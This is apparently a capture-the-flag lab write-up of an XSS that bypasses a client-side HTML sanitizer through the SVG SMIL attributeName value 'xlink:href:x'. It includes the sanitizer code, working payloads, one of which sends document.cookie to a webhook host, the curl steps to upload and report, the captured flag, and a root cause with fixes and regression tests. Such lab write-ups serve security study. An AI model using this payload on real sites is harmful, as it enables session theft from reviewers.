# Hairline Pwnbox Lab - SVG SMIL xlink:href Sanitizer Bypass

Date: 2026-07-09
Target type: CTF/lab
Bug class: XSS, client-side sanitizer bypass, SVG SMIL animation, reviewer-bot cookie theft

## Observation

Target: `https://1bb759b773aa.pwnbox-lab.com/`

Initial facts:

- Login with `demo / demo`.
- Users upload one `.html` or `.svg` snippet at a time.
- Preview at `/p/<id>` fetches `/raw/<id>` and renders via `window.setHTML(target, raw)`.
- Reviewer bot visits reported preview URLs.
- Lab hint: client-side sanitiser; reviewer auto-activates the first link in the rendered output.

Confirmed frontend flow:

1. `POST /api/login`
2. `POST /api/snippet`
3. `GET /p/<id>` loads `/sanitizer.js`, sanitizes snippet, then auto-clicks first `<a>` after 1.2s
4. `POST /api/report`

Preview auto-activation logic:

```javascript
setTimeout(() => {
  const a = target.querySelector('a');
  if (!a) return;
  a.dispatchEvent(new MouseEvent('click', {
    bubbles: true, cancelable: true, view: window,
  }));
}, 1200);
```

## Hypothesis

This build allows SVG animation primitives (`animate`, `set`, etc.) and blocks animation elements whose `attributeName` is exactly `href` or `xlink:href`. If that check is a naive string compare, namespace-parsing confusion such as `xlink:href:x` may survive sanitization while still targeting `xlink:href` at runtime.

A safe initial link can pass review, then SMIL can rewrite it to `javascript:` before the reviewer clicks.

## Evidence

Live `sanitizer.js` highlights:

```javascript
function removeAttributeIfValueIsHref(el) {
  if (!ANIMATE_ELEMENTS.has(_tagName.call(el).toLowerCase())) return false;
  const value = _getAttribute.call(el, 'attributeName') || '';
  if (value === 'href' || value === 'xlink:href') {
    return true;
  }
  return false;
}

function isJavaScriptUrl(value) {
  var s = String(value);
  s = s.replace(/[\t\n\r]/g, '');
  while (s.length > 0 && s.charCodeAt(0) <= 32) s = s.slice(1);
  return s.toLowerCase().indexOf('javascript:') === 0;
}
```

Important confirmed properties:

1. Forms are in `HARD_DENY`.
2. Direct `href="javascript:..."` is stripped via prefix check.
3. SVG animation tags are allowed.
4. `attributeName="href"` and `attributeName="xlink:href"` cause the animation element to be dropped.
5. DOM clobbering against `form.remove` is patched via prototype-safe accessors.

Searchlight-style bypass from [Two Bypasses for Chrome's Sanitizer API](https://slcyber.io/research-center/two-bypasses-for-chromes-sanitizer-api/):

- `attributeName="xlink:href:x"` is not exactly `xlink:href`, so the `<set>` / `<animate>` element survives.
- Chrome's SVG attribute parser still treats it as `xlink:href`.

Local Chrome reproduction with live sanitizer:

- `attributeName="xlink:href"` -> animation element removed.
- `attributeName="xlink:href:x"` -> survives.
- After mount, clicking the SVG link executes the rewritten `javascript:` URL.

## Failed Assumptions

1. **Pillbox-style malformed `javascript://://` URLs** - blocked because this build uses a `javascript:` prefix check, not `new URL()`.
2. **Form-action auto-submit** - forms are denied in this sanitizer build.
3. **DOM clobbering** - prototype-safe accessors patch the COLLIDE-style path.
4. **Control-character `javascript:` in `href`** - some variants survive sanitization (`jav&#x0C;ascript:`) but Chrome did not execute them on link click.
5. **`attributeName="HREF"` case bypass** - survives sanitization but SMIL did not rewrite `href` in Chrome.
6. **`new Image().src` exfil in some live tests** - reviewer hit was unreliable early on; `fetch(...)` with `encodeURIComponent(document.cookie)` produced a confirmed webhook capture.

## Test

Minimal proof payload:

```html
<svg xmlns:xlink="http://www.w3.org/1999/xlink">
  <a id="foo" xlink:href="https://example.com"><text x="20" y="20">click</text></a>
  <set href="#foo" attributeName="xlink:href:x" to="javascript:alert(1)"></set>
</svg>
```

Working exfil payload:

```html
<svg xmlns:xlink="http://www.w3.org/1999/xlink">
  <a id="foo" xlink:href="https://example.com"><text x="20" y="20">click</text></a>
  <set href="#foo" attributeName="xlink:href:x" to="javascript:eval(atob('[BASE64]'))"></set>
</svg>
```

Base64 decodes to:

```javascript
fetch('https://webhook.site/[UUID]?c='+encodeURIComponent(document.cookie))
```

Upload and report:

```bash
curl -sS -X POST "https://1bb759b773aa.pwnbox-lab.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"demo","password":"demo"}'

curl -sS -X POST "https://1bb759b773aa.pwnbox-lab.com/api/snippet" \
  -F "snippet=@pwn.html;type=text/html"

curl -sS -X POST "https://1bb759b773aa.pwnbox-lab.com/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://1bb759b773aa.pwnbox-lab.com/p/[id]"}'
```

## Result

Confirmed chain:

```text
SVG snippet upload
-> preview sanitizes in <template>
-> safe xlink:href passes review
-> <set attributeName="xlink:href:x"> survives sanitizer
-> SMIL rewrites link target to javascript:eval(atob(...))
-> reviewer auto-clicks first <a>
-> fetch exfiltrates reviewer cookie to webhook
```

Webhook evidence:

```text
c=flag=pwnbox{34f9c1a5e8d72b6049af8b1c3d2e7f95}
```

Flag:

```text
pwnbox{34f9c1a5e8d72b6049af8b1c3d2e7f95}
```

## Why Failed Payloads Failed

| Attempt | Why it failed |
|---|---|
| `<form action=...>` | Forms are `HARD_DENY` |
| `javascript://://-...` on `href` | Prefix check strips direct `javascript:` |
| `jav&#x0C;ascript:...` on `href` | Survived sanitizer but no execution on click |
| `attributeName="HREF"` | Survived sanitizer but SMIL did not rewrite `href` |
| `attributeName="href:x"` on HTML `<a>` | Survived sanitizer but did not rewrite HTML `href` |

## Why Working Test Worked

The sanitizer correctly blocked obvious paths:

- direct `javascript:` links
- animation elements targeting `href` / `xlink:href` by exact name

But it still trusted a literal string equality check for `attributeName`. The value `xlink:href:x` is not equal to `xlink:href`, so the animation element remained and rewrote the already-mounted SVG link after sanitization. The preview bot then clicked that first link without user interaction.

## Root Cause

1. `attributeName` validation used exact string comparison instead of SVG-aware attribute parsing.
2. SMIL was allowed to mutate navigation attributes after sanitization completed.
3. Reviewer auto-activation turned the rewritten link into a no-interaction XSS sink.

## Impact

- Same-origin JavaScript execution in reviewer context.
- Theft of readable reviewer cookies.
- In a real preview/review product, likely reviewer session compromise.

## Fix

- Parse `attributeName` with the same SVG attribute parser used at runtime.
- Reject any animation `attributeName` whose parsed navigation target is `href` or `xlink:href`, including `xlink:href:x`-style confusion.
- Strip `to` / `values` / `from` on animation elements when they contain `javascript:`.
- Do not auto-click links in reviewer sessions.

## Regression Test

- `<set attributeName="xlink:href:x" to="javascript:alert(1)">` must not survive sanitization.
- `<animate attributeName="xlink:href:x" values="javascript:alert(1)">` must not survive.
- Any SVG animation that can mutate `href` / `xlink:href` after sanitization should be denied.

## Conclusion

Confirmed XSS via SVG SMIL `xlink:href:x` sanitizer bypass plus reviewer auto-link activation. This is the sibling lab to Pillbox: same preview/report flow, different sanitizer weakness.

## Next Step

Create clean writeup, reusable note, and payload pattern for SMIL `attributeName` bypasses.
